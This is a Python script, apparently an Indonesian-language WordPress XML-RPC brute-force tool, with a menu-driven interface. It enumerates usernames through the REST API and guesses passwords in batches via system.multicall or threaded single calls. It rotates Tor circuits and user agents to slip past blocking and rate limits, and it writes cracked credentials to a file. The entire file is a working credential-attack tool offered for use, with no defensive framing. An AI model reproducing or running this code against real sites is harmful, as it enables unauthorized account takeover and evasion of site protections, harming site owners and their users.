#!/usr/bin/env python3
import os
import sys
import random
import time
import requests
import argparse
import threading
from stem import Signal
from stem.control import Controller
from termcolor import colored

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

tor_proxy = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)",
    "curl/8.14.1"
]

# ndasmu
sys.stdout.write("\x1b]2;Ghost-RPC MODE - By Official Marz57\x07")
sys.stdout.flush()

def clear_screen():
    os.system("clear")

def print_logo():
    print(colored(r"""
 __        __   _ _      _   _      _                 _ 
 \ \      / /__| | | ___| | | |_ __(_)_   _____ _ __ | |
  \ \ /\ / / _ \ | |/ _ \ | | | '__| \ \ / / _ \ '_ \| |
   \ V  V /  __/ | |  __/ |_| | |  | |\ V /  __/ | | |_|
    \_/\_/ \___|_|_|\___|\___/|_|  |_| \_/ \___|_| |_(_)
        XML-RPC Bruteforce | by OfficialMarz57
""", "cyan"))

def session(use_tor):
    s = requests.Session()
    s.trust_env = False
    s.headers.update({
        "User-Agent": random.choice(user_agents)
    })
    if use_tor:
        s.proxies.update(tor_proxy)
    return s

def get_ip(use_tor):
    try:
        s = session(use_tor)
        r = s.get("http://icanhazip.com", timeout=10)
        r.raise_for_status()
        return r.text.strip()
    except Exception as e:
        return f"Tidak bisa mengambil hati Metua: {e}"

def renew_tor_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        return True
    except Exception as e:
        print(colored(f"[!] Gagal mengganti IP TOR: {e}", "red"))
        return False

# sek ngonsep
def scan_wp_usernames(url, use_tor):
    """Mencoba mengambil daftar username via WordPress REST API secara otomatis"""
    usernames = []
    base_url = url.split("/xmlrpc.php")[0]
    api_url = f"{base_url}/wp-json/wp/v2/users"
    
    try:
        s = session(use_tor)
        r = s.get(api_url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            for user in data:
                if "slug" in user:
                    usernames.append(user["slug"])
    except:
        pass
    return usernames

def get_xmlrpc_status_simple(url, use_tor):
    """Cek status XML-RPC untuk header"""
    try:
        s = session(use_tor)
        headers = {'Content-Type': 'text/xml'}
        payload = "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
        r = s.post(url, data=payload, headers=headers, timeout=5, verify=False)
        
        if r.status_code == 200:
            return colored("AKTIF (GASSSS CROT DALAM)", "green")
        elif r.status_code == 405:
            return colored("MUNGKIN AKTIF (405 Method Not Allowed)", "yellow")
        elif r.status_code == 403:
            return colored("DIBLOKIR / ASING (403 Forbidden)", "red")
        else:
            return colored(f"NON-AKTIF (HTTP {r.status_code})", "red")
    except:
        return colored("DOWN / ERROR KONEKSI", "red")

def check_xmlrpc(url, use_tor):
    clear_screen()
    print_logo()
    print(colored("[*] Mengecek XML-RPC ... ", "cyan"))
    print(colored(f"[*] Target: {url}", "yellow"))
    
    try:
        s = session(use_tor)
        # Cek 1: GET Request
        r = s.get(url, timeout=10)
        print(f"HTTP Status : {r.status_code}")
        
        # Cek 2: POST Request
        print(colored("\n[*] Tes Fungsi system.listMethods...", "cyan"))
        payload = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
        headers = {'Content-Type': 'text/xml'}
        r_method = s.post(url, data=payload, headers=headers, timeout=15)
        
        if r_method.status_code == 200:
             print(colored("[✔] Respon XML-RPC Valid diterima.", "green"))
        else:
             print(colored(f"[!] Respon tidak valid: HTTP {r_method.status_code}", "red"))

    except Exception as e:
        print(colored(f"[!] Error: {e}", "red"))

    input("\nTekan ENTER untuk kembali ke masalalu...")

# ngeces sek
def test_rate_limit(url, use_tor, count):
    clear_screen()
    print_logo()
    print(colored("[*] Pengujian rate limit XML-RPC", "cyan"))
    print(colored(f"[*] Target: {url}", "yellow"))
    print(colored(f"[*] Mode : {'TOR' if use_tor else 'DIRECT'}", "cyan"))
    print(colored(f"[*] IP   : {get_ip(use_tor)}", "cyan"))
    print(colored(f"[*] Request: {count}", "cyan"))
    print()

    payload = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
    headers = {"Content-Type": "text/xml"}
    s = session(use_tor)
    results = {}

    for i in range(1, count + 1):
        try:
            start = time.time()
            headers["User-Agent"] = random.choice(user_agents)
            r = s.post(url, data=payload, headers=headers, timeout=15)
            elapsed = time.time() - start
            results[r.status_code] = results.get(r.status_code, 0) + 1

            print(f"[{i:02d}/{count}] HTTP {r.status_code} {elapsed:.2f}s")
            if r.status_code == 429:
                print(colored("[!] Server menerapkan rate limiting.", "yellow"))
                break
            time.sleep(1)
        except Exception as e:
            print(colored(f"[!] Error Kang: {e}", "red"))
            break

    print()
    print(colored("=== Ringkasan ===", "cyan"))
    for status, total in sorted(results.items()):
        print(f"HTTP {status}: {total} request")
    input("\nTekan ENTER untuk memulai kembali hubungan lama...")

def build_multicall_payload(username, passwords):
    entries = ""
    for pwd in passwords:
        entries += f"""
        <value><struct>
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data><value><array><data>
        <value><string>{username}</string></value><value><string>{pwd}</string></value>
        </data></array></value></data></array></value>
        </struct></value>"""
    return f"""<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>{entries}</data></array></value></param></params></methodCall>"""

def single_payload(username, password):
    return f"""<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{username}</string></value></param><param><value><string>{password}</string></value></param></params></methodCall>"""

# pikiren dewe
def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
    clear_screen()
    print_logo()
    print(colored("=== MENU BRUTEFORCE ===", "cyan"))
    print(f"\nTarget URL  : {colored(url, 'yellow')}")
    print(f"XML-RPC     : {xmlrpc_status}")
    print(f"Target Users: [{colored(', '.join(target_usernames), 'green') if target_usernames else colored('Kosong / Protected', 'red')}]")
    print(f"Connection  : {colored('TOR' if use_tor else 'DIRECT', 'green')}")
    

    if target_usernames:
        print(colored(f"[!] Terdeteksi {len(target_usernames)} target username otomatis: {', '.join(target_usernames)}", "green"))
        use_auto = input("Gunakan daftar username otomatis ini? [Y/n]: ").strip().lower()
        active_users = target_usernames if use_auto != 'n' else ([input("Masukkan Username Target Manual: ").strip()] if input else [])
    else:
        single_user = input("Masukkan Username Target Manual: ").strip()
        active_users = [single_user] if single_user else []

    if not active_users:
        input(colored("\n[!] Tidak ada username untuk diserang. Tekan ENTER...", "red"))
        return

    wordlist_path = input("Masukkan Path Wordlist: ").strip()
    if not os.path.exists(wordlist_path):
        input(colored("\n[!] File wordlist tidak ditemukan! Tekan ENTER...", "red"))
        return

    mode = "single" if input("Pilih Mode Brute [1. multicall (default) / 2. single]: ").strip() == "2" else "multicall"
    threads = 3
    if mode == "single":
        t_input = input("Jumlah Threads [default 3]: ").strip()
        if t_input:
            try: threads = int(t_input)
            except ValueError: pass

    with open(wordlist_path, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]

    if use_tor:
        print(colored("[*] Memvalidasi kestabilan jalur TOR ke target...", "yellow"))
        init_ready = False
        while not init_ready:
            check_s = session(use_tor)
            try:
                r_test = check_s.head(url, timeout=7, verify=False)
                if r_test.status_code in [200, 405]: 
                    init_ready = True
                    check_s.close()
                else: raise Exception()
            except:
                check_s.close()
                print(colored(f"[!] IP Awal [{current_ip}] bermasalah. Mencari sirkuit TOR baru...", "red"))
                if renew_tor_ip(): time.sleep(4); current_ip = get_ip(use_tor)
        print(colored(f"🌐 [JALUR AMAN] Siap menyerang dengan IP: {current_ip}", "green"))

    print(colored(f"\n[*] Menjalankan serangan ke {url}...", "yellow"))
    s = session(use_tor)
    success_flag = False

    for username in active_users:
        if success_flag: break
        print(colored(f"\n[*] Memulai serangan pada user: '{username}' ({len(passwords)} password)...", "yellow"))
        
        if mode == "multicall":
            batch_size = 5
            i = 0
            while i < len(passwords):
                if success_flag: break
                batch = passwords[i:i+batch_size]
                current_batch_num = (i // batch_size) + 1
                print(colored(f"🔁 Batch {current_batch_num} | User: {username} | [IP Saat Ini: {current_ip}]", "cyan"))
                
                headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
                xml = build_multicall_payload(username, batch)
                need_rotation = False
                
                try:
                    r = s.post(url, data=xml, headers=headers, timeout=20, verify=False)
                    if r.status_code == 200:
                        responses = r.text.split('<struct>')[1:] if "<struct>" in r.text else [r.text]
                        for pwd, response in zip(batch, responses):
                            print(f"🔍 {username}:{pwd}")
                            if "isAdmin" in response or "blogid" in response:
                                print(colored(f"[+] Berhasil: {username}:{pwd}", 'green'))
                                with open("success.txt", "a") as out:
                                    out.write(f"host:{url}\nusername:{username}\npassword:{pwd}\n\n")
                                success_flag = True
                                break
                        if success_flag: break
                        i += batch_size 
                    else:
                        print(colored(f"[!] Server merespon HTTP {r.status_code} (udah asing:)). Melakukan proteksi...", "yellow"))
                        need_rotation = True
                except:
                    print(colored("[!] Koneksi terputus/terblokir oleh target.", "red"))
                    need_rotation = True
                
                if need_rotation:
                    if use_tor:
                        print(colored(f"\n⚠️  [TOR ROTATION] Memicu pergantian IP lama [{current_ip}]...", "yellow"))
                        tor_ready = False
                        while not tor_ready:
                            if renew_tor_ip():
                                s.close()
                                print(colored("[*] Sirkuit TOR diperbarui. Validasi status 200...", "yellow"))
                                for retry in range(3):
                                    time.sleep(2)
                                    check_s = session(use_tor)
                                    try:
                                        dummy = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
                                        r_test = check_s.post(url, data=dummy, headers={'Content-Type': 'text/xml'}, timeout=8, verify=False)
                                        if r_test.status_code == 200: current_ip = get_ip(use_tor); tor_ready = True; check_s.close(); break
                                    except: check_s.close()
                                if tor_ready: break
                            time.sleep(3)
                        s = session(use_tor)
                        print(colored(f"🌐 [TOR SUCCESS] IP Baru Aktif: {current_ip}. Mengulang kembali batch {current_batch_num}...", "green"))
                    else:
                        print(colored("[!] Menunggu 10 detik sebelum mencoba kembali (Mode DIRECT)...", "yellow")); time.sleep(10)
                    continue 
                time.sleep(random.uniform(1.0, 2.5))

#dewean
        elif mode == "single":
            idx = 0
            while idx < len(passwords):
                if success_flag: break
                batch_pwds = passwords[idx:idx+threads]
                window_count = (idx // threads) + 1
                print(colored(f"\n🚀 Menjalankan Thread Window {window_count} | [IP Saat Ini: {current_ip}]", "cyan"))
                
                stop_event = threading.Event()
                lock = threading.Lock()
                errors_detected = []
                
                def worker(pwd):
                    if stop_event.is_set(): return
                    headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
                    xml = single_payload(username, pwd)
                    try:
                        r = s.post(url, data=xml, headers=headers, timeout=20, verify=False)
                        if r.status_code == 200:
                            print(f"🔍 {username}:{pwd}")
                            if "isAdmin" in r.text or "blogid" in r.text:
                                with lock:
                                    print(colored(f"[+] Berhasil: {username}:{pwd}", 'green'))
                                    with open("success.txt", "a") as out:
                                        out.write(f"host:{url}\nusername:{username}\npassword:{pwd}\n\n")
                                    stop_event.set()
                                    nonlocal success_flag; success_flag = True
                        else:
                            print(f"🔍 {username}:{pwd} -> HTTP {r.status_code} (Status HTTP Asing")
                            with lock: errors_detected.append(f"http_{r.status_code}")
                    except:
                        with lock: errors_detected.append("blocked")
                    time.sleep(random.uniform(1.0, 2.0))

                threads_list = []
                for pwd in batch_pwds:
                    t = threading.Thread(target=worker, args=(pwd,))
                    threads_list.append(t); t.start()
                
                for x in threads_list: x.join()
                
                if errors_detected:
                    if use_tor:
                        print(colored(f"\n⚠️  [TOR ROTATION] Terdeteksi Udah Asing. Mengganti pasangan [{current_ip}]...", "yellow"))
                        tor_ready = False
                        while not tor_ready:
                            if renew_tor_ip():
                                s.close()
                                for retry in range(3):
                                    time.sleep(2)
                                    check_s = session(use_tor)
                                    try:
                                        dummy = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
                                        r_test = check_s.post(url, data=dummy, headers={'Content-Type': 'text/xml'}, timeout=8, verify=False)
                                        if r_test.status_code == 200: current_ip = get_ip(use_tor); tor_ready = True; check_s.close(); break
                                    except: check_s.close()
                                if tor_ready: break
                            time.sleep(3)
                        s = session(use_tor)
                        print(colored(f"🌐 [TOR SUCCESS] IP Baru Aktif: {current_ip}. Mengulang window...", "green"))
                    else:
                        print(colored("[!] Terdeteksi error. Menunggu 10 detik...", "yellow")); time.sleep(10)
                    continue
                else: idx += threads

    if success_flag: print(colored("\n[+] Bruteforce Sukses! Hasil tersimpan di success.txt", "green"))
    else: print(colored("\n[-] Bruteforce Selesai! Tidak ada password yang cocok.", "red"))
    input("\nTekan ENTER untuk kembali...")
    
# menu ku dewe
def tor_menu():
    clear_screen()
    print_logo()
    print(colored("=== TOR ===", "cyan"))
    print(f"\nIP TOR saat ini: {get_ip(True)}\n")
    choice = input(" [1] Renew TOR circuit\n [2] Check TOR IP\n [0] Kembali\n\nPilih: ").strip()
    if choice == "1":
        clear_screen()
        print_logo()
        if renew_tor_ip():
            time.sleep(3)
            print(colored("[✔] Circuit TOR diperbarui.", "green"))
            print(colored(f"🌐 IP Baru: {get_ip(True)}", "cyan"))
        else: print(colored("[!] Gagal memperbarui circuit TOR.", "red"))
        input("\nTekan ENTER untuk kembali...")
    elif choice == "2":
        clear_screen()
        print_logo()
        print(colored(f"🌐 IP TOR: {get_ip(True)}", "cyan"))
        input("\nTekan ENTER untuk kembali...")

def format_target_url(raw_url):
    url = raw_url.strip()
    if not url.startswith(("http://", "https://")): url = "https://" + url
    if url.endswith("/"): url = url[:-1]
    if not url.endswith("xmlrpc.php"):
        if url.endswith("xmlrpc"): url = url + ".php"
        else: url = url + "/xmlrpc.php"
    return url

def main_menu(initial_url):
    url = format_target_url(initial_url)
    use_tor = False

    clear_screen()
    print_logo()
    print(colored(f"[*] Menghubungkan ke target: {url}...", "cyan"))
    print(colored("[*] Memeriksa status XML-RPC dan scanning user awal (Mohon tunggu)...", "yellow"))

    try:
        target_usernames = scan_wp_usernames(url, use_tor)
    except:
        target_usernames = []
        
    try:
        xmlrpc_status = get_xmlrpc_status_simple(url, use_tor)
    except:
        xmlrpc_status = colored("DOWN / TIMEOUT", "red")
    
    while True:
        clear_screen(); print_logo()
        print(colored("========================================", "cyan"))
        print(colored(" XML-RPC AUDIT & BRUTEFORCE TOOL", "cyan"))
        print(colored("========================================", "cyan"))
        
        print(f"\nTarget URL  : {colored(url, 'yellow')}")
        print(f"XML-RPC     : {xmlrpc_status}") 
        print(f"Target Users: [{colored(', '.join(target_usernames), 'green') if target_usernames else colored('Kosong / Protected', 'red')}]")
        print(f"Connection  : {colored('TOR' if use_tor else 'DIRECT', 'green')}\n")
        
        print(" [1] Switch ke Direct Connection\n [2] Switch ke TOR\n [3] Cek XML-RPC Detail (Manual)\n [4] Test Rate Limit XML-RPC\n [5] Pengaturan TOR (Circuit / IP)\n [6] START BRUTEFORCE (With TOR)\n [7] START BRUTEFORCE (Without TOR)\n [8] Ganti Host / Target URL\n [0] Keluar\n")
        
        choice = input("Pilih menu: ").strip()
        if choice == "1": 
            use_tor = False
            print(colored("[*] Memperbarui status koneksi DIRECT...", "yellow"))
            xmlrpc_status = get_xmlrpc_status_simple(url, use_tor)
        elif choice == "2": 
            use_tor = True
            print(colored("[*] Menghubungkan jalur TOR, memperbarui status...", "yellow"))
            xmlrpc_status = get_xmlrpc_status_simple(url, use_tor)
        elif choice == "3": 
            check_xmlrpc(url, use_tor)
            xmlrpc_status = get_xmlrpc_status_simple(url, use_tor)
        elif choice == "4":
            clear_screen(); print_logo()
            value = input("Jumlah request pengujian [default 10]: ").strip()
            try:
                count = max(1, min(int(value) if value else 10, 20))
                test_rate_limit(url, use_tor, count)
                xmlrpc_status = get_xmlrpc_status_simple(url, use_tor)
            except ValueError: input("\nJumlah request tidak valid. Tekan ENTER...")
        elif choice == "5": 
            tor_menu()
            if use_tor:
                xmlrpc_status = get_xmlrpc_status_simple(url, use_tor)
        elif choice == "6": run_bruteforce(url, use_tor=True, target_usernames=target_usernames, xmlrpc_status=xmlrpc_status)
        elif choice == "7": run_bruteforce(url, use_tor=False, target_usernames=target_usernames, xmlrpc_status=xmlrpc_status)
        elif choice == "8":
            clear_screen(); print_logo()
            new_target = input("Masukkan Target URL baru: ").strip()
            if new_target: 
                url = format_target_url(new_target)
                print(colored("[*] Scanning target baru...", "yellow"))
                target_usernames = scan_wp_usernames(url, use_tor)
                xmlrpc_status = get_xmlrpc_status_simple(url, use_tor)
            input("\nTekan ENTER untuk kembali...")
        elif choice == "0": clear_screen(); print("Keluar."); break
        else: input("\nPilihan tidak valid. Tekan ENTER untuk kembali...")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WordPress XML-RPC Audit & Bruteforce Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    args = parser.parse_args()
    main_menu(args.url)




